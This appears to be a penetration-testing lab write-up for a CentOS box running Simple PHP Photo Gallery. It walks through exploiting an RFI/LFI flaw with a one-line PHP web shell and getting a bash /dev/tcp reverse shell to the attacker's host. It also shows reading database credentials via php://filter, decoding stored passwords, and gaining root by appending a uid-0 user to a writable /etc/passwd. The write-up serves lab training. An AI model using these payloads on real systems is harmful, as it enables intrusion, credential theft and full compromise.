

### Lab Details 

- Difficulty: Intermediate 
- Type:  Web, LFI, RFI, Linux Priv Esc

#### Enumeration
- run `nmap`
```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.49.51
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
```
- `HTTP` port 80 hosts `Simple PHP Photo Gallery`
![[Pasted image 20260330205634.png]]
- `FTP` allows for anonymous login however unable to list files 
- `mysql` does not allow authenticate from external hosts
 

#### Initial Foothold 
- search online found exploits on `Simple PHP Photo Gallery 0.8b` https://www.exploit-db.com/exploits/7786
- however unable to perform LFI as per exploit
- searching further found RFI exploit for `0.7` https://www.exploit-db.com/exploits/48424 
- attempted against target and able to perform LFI
![[Pasted image 20260330181906.png]]
- set up simple python http server at port 21 locally 
```
$ python3 -m http.server 21
```
- create a `php webshell`
```
$ cat web_shell.php           
<?php system($_GET['cmd']); ?>
```
- perform RFI and chaining it with `id`, identified the web server is running as `Apache`
```
http://192.168.141.58/image.php?img=http://192.168.45.161:21/web_shell.php&cmd=id
```
![[Pasted image 20260330193847.png]]
- attempt to obtain a reverse shell, start `nc` on port 80
- execute RCE payload
```
http://192.168.141.58/image.php?img=http://192.168.45.161:21/web_shell.php&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.161%2F80%200%3E%261%27
```
- reverse shell obtained
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.161] from (UNKNOWN) [192.168.141.58] 58014
bash: no job control in this shell
```
- while enumerating for Initial foothold, found the `mysql` database credential in `db.php` since its been referenced in `index.php`
- the content of `index.php` can be obtained using `php filter` with `LFI`
```
http://192.168.141.58/image.php?img=php://filter/convert.base64-encode/resource=index.php
```
- decode it using base64
```
echo "index.php base64" | base64 -d
```
- same method can be used to obtain the file content of `db.php`
```
http://192.168.141.58/image.php?img=php://filter/convert.base64-encode/resource=db.php
```
- decode it using base64
```
$ echo 'PD9waHAKZGVmaW5lKCdEQkhPU1QnLCAnMTI3LjAuMC4xJyk7CmRlZmluZSgnREJVU0VSJywgJ3Jvb3QnKTsKZGVmaW5lKCdEQlBBU1MnLCAnTWFsYXByb3BEb2ZmVXRpbGl6ZTEzMzcnKTsKZGVmaW5lKCdEQk5BTUUnLCAnU2ltcGxlUEhQR2FsJyk7Cj8+Cg==' | base64 -d
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```
#### Lateral Movement (If any)
- with the database credentials obtained, next step is to enumerate `mysql` database on the target
```
bash-4.2$ mysql -u root -p
mysql -u root -p
Enter password: MalapropDoffUtilize1337

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> USE SimplePHPGal;
USE SimplePHPGal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
SHOW TABLES;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users;
SELECT * FROM users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)

mysql>
```
- user `michael` password is identified
- the hash type is base64 and its double hashed, use base64 to obtain the plaintext
```
$ echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d
SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                             
$ echo 'SG9ja1N5ZG5leUNlcnRpZnkxMjM=' | base64 -d            
HockSydneyCertify123 
```
#### Privilege Escalation
- use `michael` credential to login to target via `ssh`
- load and run `linpeas.sh`, found `/etc/passwd` is writable by user `michael`
```
<SNIP>
══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                                 
                                                                                                                                                                                             
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
<SNIP>
```
- a new root user can be append with the writability
- first obtain the password hash for the new root user 
```
kali@kali:~$ openssl passwd -1 -salt GitRekt pwn1337
$1$GitRekt$FzDARwVLdGr6swDMInZda1
```
- then append the hash to `/etc/passwd`
```
[michael@snookums ~]$ echo 'GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash' >> /etc/passwd
```
- login to target via `ssh` as the new root user 
```
kali@kali:~$ ssh GitRekt@192.168.120.135
GitRekt@192.168.120.135's password: 
[root@snookums ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
#### Resources

#### Lesson Learned
- Try different exploit for different versions of the target application